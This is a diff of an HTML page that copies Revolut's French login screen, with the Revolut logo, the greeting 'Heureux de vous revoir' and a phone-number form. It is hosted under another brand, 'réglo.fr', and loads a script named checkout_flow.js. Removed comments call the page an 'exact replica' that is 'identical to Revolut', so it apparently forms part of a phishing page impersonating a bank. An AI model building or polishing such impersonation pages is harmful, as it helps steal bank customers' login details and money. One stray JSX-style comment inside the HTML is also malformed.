@@ -3,22 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Revolut - Connexion</title>
+    <title>Revolut - Connexion | réglo.fr</title> <!-- Updated title -->
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="revolut_theme.css">
 </head>
 <body class="revolut-theme">
-    <!-- Header - Identical to Revolut -->
-    <header class="revolut-header">
-        <div class="revolut-logo">
-            <div class="logo">réglo<span>.</span></div>
+    <header class="site-header">
+        <div class="container">
+            <div class="logo-area">
+                <a href="index.html" class="logo">réglo<span>.</span></a>
+            </div>
         </div>
     </header>
 
-    <!-- Main Content - Exact replica -->
-    <main class="revolut-container">
+    <main class="revolut-page-content container"> {/* Added main wrapper */}
         <div class="revolut-card">
-            <!-- Added Revolut logo here -->
             <div class="revolut-auth-logo">
                 <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
             </div>
@@ -26,7 +25,7 @@
             <h1 class="revolut-title">Heureux de vous revoir</h1>
             <p class="revolut-subtitle">Saisissez le numéro de téléphone associé à votre compte Revolut.</p>
             
-            <form id="revolut-phone-form"> <!-- Added form element -->
+            <form id="revolut-phone-form">
                 <div class="revolut-phone-input">
                     <label class="revolut-label">Numéro de téléphone</label>
                     <div class="revolut-input-group">
@@ -42,14 +41,14 @@
                             </select>
                         </div>
                         <div class="revolut-phone-field">
-                            <input type="tel" id="revolut-phone" placeholder="Saisissez votre numéro de téléph..." inputmode="numeric" required> <!-- Added id and required -->
+                            <input type="tel" id="revolut-phone" placeholder="Saisissez votre numéro de téléph..." inputmode="numeric" required>
                         </div>
                     </div>
                 </div>
                 
                 <a href="#" class="revolut-link">Je n'ai plus accès à mon numéro de téléphone</a>
                 
-                <button type="submit" class="revolut-button" id="revolutContinueBtn"> <!-- Changed to type="submit" -->
+                <button type="submit" class="revolut-button" id="revolutContinueBtn">
                     Continuer
                     <span class="revolut-loading" id="revolutLoading" style="display: none;">
                         <span class="revolut-loading-dot"></span>
@@ -61,9 +60,21 @@
         </div>
     </main>
 
-    <!-- Footer - Same as original -->
-    <footer class="revolut-footer">
-        <p>Votre demande est en cours de traitement<span id="revolutLoadingDots"></span></p>
+    <footer class="site-footer-v2">
+        <div class="container">
+            <div class="footer-columns">
+                <div class="footer-column">
+                    <h4>Support</h4>
+                    <ul>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="javascript:void(0);" class="legal-link" data-type="terms">CGV</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom-v2">
+                <p>&copy; 2024 réglo. Tous droits réservés.</p>
+            </div>
+        </div>
     </footer>
 
     <script src="checkout_flow.js" defer></script>
